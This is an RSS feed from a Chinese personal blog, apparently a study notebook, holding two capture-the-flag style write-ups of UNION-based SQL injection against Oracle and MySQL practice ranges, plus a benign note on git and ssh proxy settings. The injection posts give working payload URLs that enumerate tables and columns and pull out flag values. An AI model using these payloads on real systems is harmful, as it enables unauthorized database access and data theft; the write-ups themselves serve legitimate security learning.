<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>备忘录</title>
    <link>https://xxxhidexxx.github.io/</link>
    <description>Recent content on 备忘录</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>null</copyright>
    <lastBuildDate>Fri, 02 Feb 2024 00:00:00 +0000</lastBuildDate>
    
        <atom:link href="https://xxxhidexxx.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>Oracle 联合注入</title>
        <link>https://xxxhidexxx.github.io/posts/sec/sqli2/</link>
        <pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/sqli2/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli2/ -&lt;p&gt;靶场界面如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-0.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们先确认一下参数 id 处存在注入点。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; or &#39;1&#39;=&#39;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-1.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; order by 6 --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-2.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。&lt;/p&gt;
&lt;p&gt;先确认一下没有报错。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select null,null,null,null,null from dual --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后确认回显点的数据类型，我们只需要一个回显点就够了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,&#39;a&#39;,null,null,null from dual --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-3.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在我们使用 oracle 的自带库。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,table_name,null,null,null from user_all_tables --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-4.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们找到了 flag 的表，进一步查询字段。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,column_name,null,null,null from all_tab_columns where table_name=&#39;UNION_FLAG&#39; --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-5.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此我们就找到了 flag。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://111.9.41.91:53109/?id=1&#39; union select 1,FLAG,null,null,null from UNION_FLAG --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli2-6.png&#34; alt=&#34;sqli2&#34;&gt;&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/sqli2/ - null</description>
        </item>
    
    
    
        <item>
        <title>MySQL 联合注入</title>
        <link>https://xxxhidexxx.github.io/posts/sec/sqli1/</link>
        <pubDate>Thu, 01 Feb 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/sqli1/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/posts/sec/sqli1/ -&lt;p&gt;对 mysql 进行联合注入是在有回显点的情况下用 union select 直接查询数据库内容，查询结果在回显点用 group_concat 输出。常见的关系型数据库都有系统自带库，mysql 的是 information_schema 这个库，其中存储着全部库名、表名、字段名。我们这里要做的是在 information_schema 找到关键的库、表、字段，从而找到 flag。&lt;/p&gt;
&lt;p&gt;靶场界面如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-0.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先在 id 参数之后加单引号进行尝试。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-1.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现报错说明有注入点，这里甚至直接看到了 sql 语句。我们用 order by 猜测字段数，order by 2 正常，到 3 之后出现报错，说明有两个字段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-2.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;用联合查询查找回显点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-3.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现了一个回显点。那么我们可以直接爆出所有的库名和表名了。构造如下 poc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?id=-1&#39; union select null，group_concat(schema_name) from information_schema.schemata --+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到如下显示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-4.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-5.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-6.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/sqli1/sqli1-7.png&#34; alt=&#34;sqli1&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此这个靶场的 flag 就拿到了。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/sqli1/ - null</description>
        </item>
    
    
    
        <item>
        <title>和 GitHub 相关的网络代理设置</title>
        <link>https://xxxhidexxx.github.io/about/githubproxy/</link>
        <pubDate>Mon, 29 Jan 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/about/githubproxy/</guid>
        <description>备忘录 https://xxxhidexxx.github.io/about/githubproxy/ -&lt;p&gt;我们的浏览器通过 http 代理可以正常访问 github，现在我们希望通过 ssh 远程关联 github 仓库。&lt;/p&gt;
&lt;p&gt;遇到了两个问题：1，默认的端口 22 连接超时；2，改成端口 443 依然连接超时。&lt;/p&gt;
&lt;p&gt;首先，在打开 powershell 终端的时候，设置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set http_proxy=127.0.0.1：10809
set https_proxy=127.0.0.1：10809
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;记得别打空格。这样就设置好了 power shell 的代理。&lt;/p&gt;
&lt;p&gt;其次，在 &lt;code&gt;C:/Users/someone/.ssh&lt;/code&gt; 打开 git bash 输入 &lt;code&gt;touch config&lt;/code&gt; 建立一个 config 文件，并在 config 中写入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host github.com
Hostname ssh.github.com
Port 443
User git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这一步解决的是用 ssh 连接 github 走 http 代理。&lt;/p&gt;
&lt;p&gt;最后再来设置 git 的代理。终端输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --global http.proxy 127.0.0.1:10809
&lt;/code&gt;&lt;/pre&gt;
- https://xxxhidexxx.github.io/about/githubproxy/ - null</description>
        </item>
    
    
  </channel>
</rss> 